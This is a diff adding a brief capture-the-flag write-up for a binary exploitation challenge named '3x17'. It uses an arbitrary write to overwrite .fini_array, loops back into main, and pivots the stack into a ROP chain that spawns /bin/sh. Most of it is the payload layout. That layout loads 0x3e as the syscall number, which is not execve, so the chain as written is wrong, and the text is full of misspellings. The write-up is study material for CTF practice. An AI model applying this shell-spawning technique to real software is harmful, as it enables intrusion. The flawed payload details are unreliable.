@@ -1,0 +1,46 @@
+WRITE UP FOR 3x17
+
+Overview:- we can abritary write address and data
+	 - Constrait: messy decomplier, can see main function.
+
+ 
+Input: 
+-An address in string form 
+-Data to aboved address
+
+New thing to learn:
+Every program will first call .Init and last call .Finit in _libc_start_main_ 
+-Init: .init_arr:  contain pointer to constructor of function of program
+-Fniit: .finit_arr: contain pointer to destructor of function of program
+
+Exploit:
+This binary has a function which called pointer in .finit_arr.(0x402960)
+We can create an infinte loop by overwrite these pointer by main address and the .finit_call itself
+	.finit_arr: [.finit_call]-> [main]
+
+Then we can craft a payload on this finit_arr , call leave to drop the stack to this arr
+payload layout:
+
+.finit_call<---- replace by LEAVE at last to out loop
+------
+main
+------
+pop_rdi
+------
+bin_sh
+-----
+pop_rdx
+-----
+0
+------
+pop_rsi
+------
+0
+----
+pop_rax
+---
+3e
+------
+syscal
+-----
+/bin/sh\0
